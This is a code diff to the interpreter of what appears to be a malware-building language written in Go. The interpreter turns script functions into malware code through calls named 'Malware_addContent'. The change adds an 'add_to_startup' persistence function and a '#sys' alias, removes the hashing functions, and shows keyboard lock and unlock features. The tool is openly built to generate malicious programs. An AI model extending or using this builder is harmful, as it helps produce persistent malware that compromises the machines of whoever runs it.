@@ -63,7 +63,7 @@ func Interpeter(file_to_read string) {
 				notify.Notify_error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
 			}
 
-		case "system": // The system domain was called
+		case "system", "#sys": // The system domain was called
 			io.Append_domain("system")
 			switch funct[2] { // Function within this domain
 			case "exit":
@@ -71,6 +71,8 @@ func Interpeter(file_to_read string) {
 
 			case "out":
 				mal.Malware_addContent("sys.System_out(\"" + funct[4] + "\")")
+			case "add_to_startup":
+				mal.Malware_addContent("sys.System_add_to_startup()")
 
 			default:
 				notify.Notify_error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
@@ -116,48 +118,6 @@ func Interpeter(file_to_read string) {
 			case "unlock":
 				mal.Malware_addContent("keyboard.Keyboard_unlock()")
 
-			default:
-				notify.Notify_error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
-			}
-
-		case "hashing", "#hash":
-			io.Append_domain("hashing")
-			switch funct[2] {
-			case "md5":
-				mal.Malware_addContent("hash.Hashing_md5(\"" + funct[4] + "\")")
-			// Sha1
-			case "sha1":
-				mal.Malware_addContent("hash.Hashing_sha1(\"" + funct[4] + "\")")
-
-			// Sha2
-			case "sha224":
-				mal.Malware_addContent("hash.Hashing_sha224(\"" + funct[4] + "\")")
-			case "sha256":
-				mal.Malware_addContent("hash.Hashing_sha256(\"" + funct[4] + "\")")
-			case "sha384":
-				mal.Malware_addContent("hash.Hashing_sha384(\"" + funct[4] + "\")")
-			case "sha512":
-				mal.Malware_addContent("hash.Hashing_sha512(\"" + funct[4] + "\")")
-
-			// Sha3
-			case "sha3_224":
-				mal.Malware_addContent("hash.Hashing_sha3_224(\"" + funct[4] + "\")")
-			case "sha3_256":
-				mal.Malware_addContent("hash.Hashing_sha3_256(\"" + funct[4] + "\")")
-			case "sha3_384":
-				mal.Malware_addContent("hash.Hashing_sha3_384(\"" + funct[4] + "\")")
-			case "sha3_512":
-				mal.Malware_addContent("hash.Hashing_sha3_512(\"" + funct[4] + "\")")
-
-			// Blake2
-			case "blake2s_256":
-				mal.Malware_addContent("hash.Hashing_blake2s_256(\"" + funct[4] + "\")")
-			case "blake2b_256":
-				mal.Malware_addContent("hash.Hashing_blake2b_256(\"" + funct[4] + "\")")
-			case "blake2b_384":
-				mal.Malware_addContent("hash.Hashing_blake2b_384(\"" + funct[4] + "\")")
-			case "blake2b_512":
-				mal.Malware_addContent("hash.Hashing_blake2b_512(\"" + funct[4] + "\")")
 			default:
 				notify.Notify_error("Unknown function '"+funct[2]+"' in domain '"+funct[1]+"'", "parser.interpreter()")
 			}
